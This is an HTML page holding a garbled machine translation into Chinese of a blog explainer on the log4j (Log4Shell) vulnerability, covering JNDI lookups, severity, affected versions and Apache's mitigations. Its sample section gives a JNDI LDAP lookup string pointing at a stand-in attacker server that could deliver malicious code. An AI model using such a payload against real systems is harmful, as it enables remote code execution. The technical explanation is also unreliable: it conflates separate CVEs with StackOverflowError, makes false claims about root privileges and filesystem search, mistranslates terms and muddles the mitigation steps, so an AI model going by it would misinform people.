<html>
<head>
<title>Apache log4j vulnerability</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Apache log4j漏洞</h1>
<blockquote>原文：<a href="https://medium.com/nerd-for-tech/apache-log4j-vulnerability-67d00ad56270?source=collection_archive---------3-----------------------#2021-12-22">https://medium.com/nerd-for-tech/apache-log4j-vulnerability-67d00ad56270?source=collection_archive---------3-----------------------#2021-12-22</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><p id="e24a" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">下面的文章假设读者对Apache log4j库有一些基本的了解。</p><p id="5d5b" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">这是用于伐木的最著名的阿帕奇图书馆之一。log4j漏洞已经席卷全球。企业竞相修补log4j版本。让我们讨论一下这个问题。</p></div><div class="ab cl jd je gp jf" role="separator"><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji"/></div><div class="hb hc hd he hf"><h1 id="839e" class="jk jl hi bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">什么和如何</h1><p id="3da2" class="pw-post-body-paragraph if ig hi ih b ii ki ik il im kj io ip iq kk is it iu kl iw ix iy km ja jb jc hb bi translated">在10000英尺上，问题与StackOverflowError有关。这个问题与一个叫做<strong class="ih hj"> JNDI和变量外推</strong>的特定功能有关。只有带有上下文查找的<strong class="ih hj">模式布局(例如，$${ctx:loginId}) </strong>容易受到这种攻击。</p><p id="c342" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">首先，JNDI指的是Java命名和目录接口，它是一个API，为使用Java编程语言的应用程序提供命名和目录功能。<br/>另一个概念变量外推指的是在运行时如何解析变量的值。</p><p id="6108" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">log4j在日志语句中使用变量外推法来解析变量的值。例如</p><blockquote class="kn ko kp"><p id="63e3" class="if ig kq ih b ii ij ik il im in io ip kr ir is it ks iv iw ix kt iz ja jb jc hb bi translated"><strong class="ih hj"> log.debug("这是要揭露的漏洞编号:${vNo}" </strong></p></blockquote><p id="c230" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">实际记录的语句应该是</p><blockquote class="kn ko kp"><p id="563f" class="if ig kq ih b ii ij ik il im in io ip kr ir is it ks iv iw ix kt iz ja jb jc hb bi translated"><strong class="ih hj"> 22/12/2021 13:20调试这是为了揭露漏洞编号:CVE-2021–44228</strong></p></blockquote><blockquote class="ku"><p id="6bc9" class="kv kw hi bd kx ky kz la lb lc ld jc dx translated">现在JNDI查找的作用来了。在通过虚拟机或容器部署的企业中，JAVA应用程序以root权限运行。使用root权限和JNDI尝试在文件系统中递归搜索变量或远程查找，如果变量被修改为错误的值，那么它可以访问文件系统中应受保护的值。</p></blockquote><p id="a6c8" class="pw-post-body-paragraph if ig hi ih b ii le ik il im lf io ip iq lg is it iu lh iw ix iy li ja jb jc hb bi translated">说到这里，我提到了带有上下文查找的<strong class="ih hj">模式布局会出现这个问题(例如，$${ctx:loginId})。<br/> </strong>这里的意思是:<strong class="ih hj">布局</strong>是一种格式，日志事件需要以这种格式形成，以便与消费者处理事件兼容。<strong class="ih hj">模式布局</strong>是一种布局，其中日志语句基于为log4j配置的转换字符串。</p></div><div class="ab cl jd je gp jf" role="separator"><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji"/></div><div class="hb hc hd he hf"><h1 id="3544" class="jk jl hi bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">样品</h1><p id="b583" class="pw-post-body-paragraph if ig hi ih b ii ki ik il im kj io ip iq kk is it iu kl iw ix iy km ja jb jc hb bi translated">让我们看前面的例子</p><blockquote class="kn ko kp"><p id="4d50" class="if ig kq ih b ii ij ik il im in io ip kr ir is it ks iv iw ix kt iz ja jb jc hb bi translated"><strong class="ih hj"> log.debug("这是揭露漏洞号:${vNo}" </strong></p></blockquote><p id="a274" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">现在，假设我们的应用程序可以控制变量的值。假设<strong class="ih hj"> vNo </strong>的值来自<strong class="ih hj">jndi:LDAP://my-server . com/getVno</strong><br/>log4j将获取该值，并将执行JNDI查找来获取该值。假设这个my-service.com被对手控制了。现在这个域可以被修改下载一些恶意代码。</p></div><div class="ab cl jd je gp jf" role="separator"><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji"/></div><div class="hb hc hd he hf"><h1 id="a19c" class="jk jl hi bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">严重</h1><p id="8920" class="pw-post-body-paragraph if ig hi ih b ii ki ik il im kj io ip iq kk is it iu kl iw ix iy km ja jb jc hb bi translated">这被评为<strong class="ih hj">中度</strong>漏洞，后来升级为<strong class="ih hj">严重</strong>。利用此漏洞可以攻击的类型有<br/> 1。LCE -本地代码执行<br/> 2。RCE -远程代码执行</p><p id="1a65" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">有一个标准的漏洞评分机制，称为CVSS或通用漏洞评分系统。log4j漏洞的得分为<strong class="ih hj">10/10</strong>，这是最高形式的漏洞。</p></div><div class="ab cl jd je gp jf" role="separator"><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji"/></div><div class="hb hc hd he hf"><h1 id="014e" class="jk jl hi bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">受影响的版本</h1><p id="cd59" class="pw-post-body-paragraph if ig hi ih b ii ki ik il im kj io ip iq kk is it iu kl iw ix iy km ja jb jc hb bi translated">log4j 2的所有版本都会受到影响。</p></div><div class="ab cl jd je gp jf" role="separator"><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji"/></div><div class="hb hc hd he hf"><h1 id="dc9e" class="jk jl hi bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">减轻</h1><p id="b34e" class="pw-post-body-paragraph if ig hi ih b ii ki ik il im kj io ip iq kk is it iu kl iw ix iy km ja jb jc hb bi translated"><a class="ae lj" href="https://logging.apache.org/log4j/2.x/security.html" rel="noopener ugc nofollow" target="_blank">(来自阿帕奇doc) </a></p><ul class=""><li id="c1bb" class="lk ll hi ih b ii ij im in iq lm iu ln iy lo jc lp lq lr ls bi translated">升级到Log4j 2.3.1(适用于Java 6)、2.12.3(适用于Java 7)或2.17.0(适用于Java 8及更高版本)。</li><li id="08e8" class="lk ll hi ih b ii lt im lu iq lv iu lw iy lx jc lp lq lr ls bi translated">否则，在2.16.0以外的任何版本中，您都可以从类路径中删除JndiLookup类:zip -q -d log4j-core-*。jar org/Apache/logging/Log4j/core/lookup/jndilookup . class<br/>升级到Log4j 2.3.1(针对Java 6)、2.12.3(针对Java 7)或2.17.0(针对Java 8及更高版本)。<br/>从2.17.0版本开始，(以及Java 7和Java 6的2.12.3和2.3.1)，只递归展开配置中的查找字符串；在任何其他用法中，只解析顶级查找，而不解析任何嵌套查找。</li></ul></div><div class="ab cl jd je gp jf" role="separator"><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji jj"/><span class="jg bw bk jh ji"/></div><div class="hb hc hd he hf"><p id="7baa" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">就是这样。因为这个问题的影响是广泛的，所以我想写一篇关于这个话题的文章。希望这些细节能对你有所帮助，如果有任何出入，请告诉我。</p></div></div>    
</body>
</html>